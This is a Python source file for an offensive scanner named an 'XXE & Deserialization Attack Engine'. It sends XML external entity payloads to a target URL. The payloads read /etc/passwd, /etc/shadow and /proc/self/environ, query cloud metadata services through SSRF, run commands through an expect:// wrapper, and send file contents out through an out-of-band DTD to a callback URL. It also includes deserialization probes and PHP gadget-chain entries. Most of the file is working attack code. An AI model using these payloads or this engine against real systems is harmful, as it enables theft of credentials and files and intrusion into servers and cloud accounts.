#!/usr/bin/env python3
"""
ZYLON FUSION - XXE & Deserialization Attack Engine
Fused from: XXEinjector + XXExploiter + PHPGGC + Ysoserial concepts
Capabilities:
  - XXE detection (in-band, error-based, blind/OOB)
  - XXE payload generation (file read, SSRF, RCE, DoS)
  - PHP wrapper XXE exploitation
  - OOB XXE via external DTD
  - Blind XXE via parameter entities
  - XXE to SSRF conversion
  - Java deserialization detection (ysoserial-style)
  - PHP deserialization (PHPGGC-style gadget chains)
  - JSON/XML deserialization testing
  - Custom DTD generation for OOB exfiltration
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import time
import base64
import random
import string
from datetime import datetime
from urllib.parse import quote

from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
from core.var import USER_AGENTS, DEFAULT_TIMEOUT

# ============================================================================
# XXE PAYLOAD DATABASE (from XXEinjector + XXExploiter)
# ============================================================================

XXE_FILE_READ_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/Windows/win.ini">]><root>&xxe;</root>''',
]

XXE_SSRF_PAYLOADS = [
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">]><root>&xxe;</root>''',
]

XXE_PHP_WRAPPERS = [
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>''',
    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>''',
]

XXE_OOB_TEMPLATE = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{file_path}">
  <!ENTITY % dtd SYSTEM "{callback_url}/xxe.dtd">
  %dtd;
]>
<root>&send;</root>'''

XXE_DTD_TEMPLATE = '''<!ENTITY % all "<!ENTITY &#37; send SYSTEM '{callback_url}/?data=%file;'>">
%all;
%send;'''

# XXE Error patterns
XXE_ERROR_PATTERNS = [
    r"SimpleXMLElement", r"XMLReader", r"DOMDocument",
    r"XMLError", r"not well-formed", r"unparsed entity",
    r"external entity", r"ENTITY", r"DOCTYPE",
    r"XML parsing error", r"SAXParseException",
    r"org.xml.sax", r"javax.xml",
]

# Deserialization signatures
DESERIAL_SIGNS_JAVA = [
    r"java\.lang\.", r"java\.io\.", r"serialVersionUID",
    r"readObject", r"ObjectInputStream", r"readUnshared",
    r"\xac\xed\x00\x05",  # Java serialization magic bytes (base64: rO0ABQ)
]

DESERIAL_SIGNS_PHP = [
    r'O:\d+:"',  # PHP object serialization: O:8:"ClassName"
    r's:\d+:"',  # PHP string serialization
    r'a:\d+:\{',  # PHP array serialization
]

DESERIAL_SIGNS_JSON = [
    r'"@type"', r'"__class"', r'"class"',
    r'"org\.springframework"', r'"com\.fasterxml"',
]

# PHPGGC-style gadget chains (concepts)
PHPGGC_GADGETS = {
    "laravel_rce1": {
        "framework": "Laravel",
        "chain": "Illuminate\\Broadcasting\\PendingBroadcast -> Illuminate\\Bus\\Dispatcher",
        "risk": "critical",
        "description": "RCE via Laravel broadcast dispatch",
    },
    "monolog_rce1": {
        "framework": "Monolog",
        "chain": "Monolog\\Handler\\BufferHandler -> Monolog\\Handler\\SyslogUdpHandler",
        "risk": "critical",
        "description": "RCE via Monolog buffer handler",
    },
    "symfony_rce1": {
        "framework": "Symfony",
        "chain": "Symfony\\Component\\Cache\\CacheItem",
        "risk": "critical",
        "description": "RCE via Symfony cache item",
    },
    "guzzle_rce1": {
        "framework": "Guzzle",
        "chain": "GuzzleHttp\\Cookie\\FileCookieJar",
        "risk": "high",
        "description": "File write via Guzzle cookie jar",
    },
}


class XXEEngine:
    """XXE & Deserialization Attack Engine"""

    def __init__(self, target_url=None, parameter=None, method="POST",
                 headers=None, callback_url=None, timeout=10, proxy=None):
        self.target_url = target_url
        self.parameter = parameter or "xml"
        self.method = method.upper()
        self.headers = headers or {}
        if not callback_url:
            payload_id = oob_provider.generate_payload_id()
            self.callback_url = oob_provider.get_callback_url(payload_id)
        else:
            self.callback_url = callback_url
        self.timeout = timeout
        self.session = shared_session

    # ========================================================================
    # SCAN 1: XXE Detection
    # ========================================================================

    def detect_xxe(self):
        """Detect XXE vulnerability"""
        results = {
            "vulnerable": False,
            "type": None,
            "evidence": [],
        }

        # Test in-band XXE
        for payload in XXE_FILE_READ_PAYLOADS[:2]:
            try:
                if self.method == "POST":
                    resp = self.session.post(self.target_url, data=payload,
                                            headers=self.headers, timeout=self.timeout)
                else:
                    sep = "&" if "?" in self.target_url else "?"
                    url = f"{self.target_url}{sep}{self.parameter}={quote(payload)}"
                    resp = self.session.get(url, timeout=self.timeout)

                if resp and resp.status_code == 200:
                    text = resp.text
                    # Check for file content
                    if "root:x:0:0:" in text or "[fonts]" in text:
                        results["vulnerable"] = True
                        results["type"] = "in_band"
                        results["evidence"].append({
                            "payload": payload[:80],
                            "response_preview": text[:200],
                        })
                        return results

                    # Check for error-based XXE
                    for pattern in XXE_ERROR_PATTERNS:
                        if regex_cache.search(pattern, text, re.IGNORECASE):
                            results["vulnerable"] = True
                            results["type"] = "error_based"
                            results["evidence"].append({
                                "payload": payload[:80],
                                "error_pattern": pattern,
                            })
                            break
            except Exception:
                continue

        # Test PHP wrapper XXE
        for payload in XXE_PHP_WRAPPERS:
            try:
                if self.method == "POST":
                    resp = self.session.post(self.target_url, data=payload,
                                            headers=self.headers, timeout=self.timeout)
                else:
                    sep = "&" if "?" in self.target_url else "?"
                    url = f"{self.target_url}{sep}{self.parameter}={quote(payload)}"
                    resp = self.session.get(url, timeout=self.timeout)

                if resp and resp.status_code == 200:
                    # Check for base64-encoded content
                    b64_match = regex_cache.search(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                            if "root:" in decoded or "root:x:" in decoded:
                                results["vulnerable"] = True
                                results["type"] = "in_band_php_wrapper"
                                results["evidence"].append({
                                    "payload": payload[:80],
                                    "decoded_content": decoded[:200],
                                })
                        except Exception:
                            pass
            except Exception:
                continue

        # Test JSON body injection
        for payload in XXE_FILE_READ_PAYLOADS[:2]:
            try:
                self.session.post(self.target_url, json={self.parameter: payload},
                                 headers=self.headers, timeout=self.timeout, verify=False)
            except Exception:
                pass

        return results

    # ========================================================================
    # SCAN 2: XXE File Extraction
    # ========================================================================

    def extract_file(self, file_path="/etc/passwd"):
        """Extract file via XXE"""
        results = {
            "file_path": file_path,
            "extracted": False,
            "content": None,
        }

        payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>
<root>&xxe;</root>'''

        try:
            if self.method == "POST":
                resp = self.session.post(self.target_url, data=payload,
                                        headers=self.headers, timeout=self.timeout)
            else:
                sep = "&" if "?" in self.target_url else "?"
                url = f"{self.target_url}{sep}{self.parameter}={quote(payload)}"
                resp = self.session.get(url, timeout=self.timeout)

            if resp and resp.status_code == 200:
                # Try PHP filter base64
                b64_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">]>
<root>&xxe;</root>'''

                resp2 = None
                if self.method == "POST":
                    resp2 = self.session.post(self.target_url, data=b64_payload,
                                             headers=self.headers, timeout=self.timeout)
                else:
                    sep = "&" if "?" in self.target_url else "?"
                    url = f"{self.target_url}{sep}{self.parameter}={quote(b64_payload)}"
                    resp2 = self.session.get(url, timeout=self.timeout)

                for r in [resp, resp2]:
                    if r:
                        text = r.text
                        b64_match = regex_cache.search(r'[A-Za-z0-9+/]{10,}={0,2}', text)
                        if b64_match:
                            try:
                                decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
                                if len(decoded) > 5:
                                    results["extracted"] = True
                                    results["content"] = decoded
                                    return results
                            except Exception:
                                pass

                        if len(text) > 10 and ("root:" in text or "[" in text):
                            results["extracted"] = True
                            results["content"] = text
                            return results
        except Exception:
            pass

        return results

    # ========================================================================
    # SCAN 3: XXE SSRF
    # ========================================================================

    def xxe_ssrf(self):
        """Exploit XXE for SSRF"""
        results = {
            "ssrf_achieved": False,
            "internal_services": [],
        }

        for payload in XXE_SSRF_PAYLOADS:
            try:
                if self.method == "POST":
                    resp = self.session.post(self.target_url, data=payload,
                                            headers=self.headers, timeout=self.timeout)
                else:
                    sep = "&" if "?" in self.target_url else "?"
                    url = f"{self.target_url}{sep}{self.parameter}={quote(payload)}"
                    resp = self.session.get(url, timeout=self.timeout)

                if resp and resp.status_code == 200:
                    text = resp.text
                    if "ami-" in text or "iam" in text.lower() or len(text) > 20:
                        results["ssrf_achieved"] = True
                        results["internal_services"].append({
                            "payload": payload[:80],
                            "response": text[:300],
                        })
            except Exception:
                continue

        return results

    # ========================================================================
    # SCAN 4: Deserialization Detection
    # ========================================================================

    def detect_deserialization(self):
        """Detect insecure deserialization"""
        results = {
            "vulnerable": False,
            "java_detected": False,
            "php_detected": False,
            "json_detected": False,
            "evidence": [],
        }

        # Check for Java serialization magic bytes
        java_b64_prefix = "rO0AB"  # ac ed 00 05 in base64
        test_payloads = [
            (java_b64_prefix + "QX", "java_serialization"),
            ('O:8:"stdClass":0:{}', "php_serialization"),
            ('{"@type":"java.lang.AutoCloseable"}', "json_deserialization"),
        ]

        for payload, dtype in test_payloads:
            try:
                # Try as POST data
                for content_type in ['application/x-www-form-urlencoded',
                                    'application/json', 'application/xml']:
                    h = self.headers.copy()
                    h['Content-Type'] = content_type
                    resp = self.session.post(self.target_url, data=payload,
                                            headers=h, timeout=self.timeout)
                    if resp:
                        text = resp.text
                        # Check for deserialization errors
                        if dtype == "java_serialization":
                            for pat in DESERIAL_SIGNS_JAVA:
                                if regex_cache.search(pat, text):
                                    results["java_detected"] = True
                                    results["evidence"].append({"type": dtype, "pattern": pat})
                        elif dtype == "php_serialization":
                            for pat in DESERIAL_SIGNS_PHP:
                                if regex_cache.search(pat, text):
                                    results["php_detected"] = True
                                    results["evidence"].append({"type": dtype, "pattern": pat})
                        elif dtype == "json_deserialization":
                            for pat in DESERIAL_SIGNS_JSON:
                                if regex_cache.search(pat, text):
                                    results["json_detected"] = True
                                    results["evidence"].append({"type": dtype, "pattern": pat})
            except Exception:
                continue

        results["vulnerable"] = bool(results["evidence"])
        return results

    # ========================================================================
    # SCAN 5: Full XXE + Deserialization Audit
    # ========================================================================

    def full_audit(self):
        """Complete XXE and deserialization assessment"""
        return {
            "xxe_detection": self.detect_xxe(),
            "xxe_ssrf": self.xxe_ssrf(),
            "deserialization": self.detect_deserialization(),
        }


# ============================================================================
# CONVENIENCE RUNNER FUNCTIONS
# ============================================================================

def run_xxe_scan(target, scan_type="detect", **kwargs):
    """Run XXE/deserialization scan"""
    engine = XXEEngine(target_url=target, **kwargs)

    scan_methods = {
        "detect": engine.detect_xxe,
        "extract": engine.extract_file,
        "ssrf": engine.xxe_ssrf,
        "deserialization": engine.detect_deserialization,
        "full": engine.full_audit,
    }

    if scan_type in scan_methods:
        return scan_methods[scan_type]()
    return {"error": f"Unknown scan type: {scan_type}"}
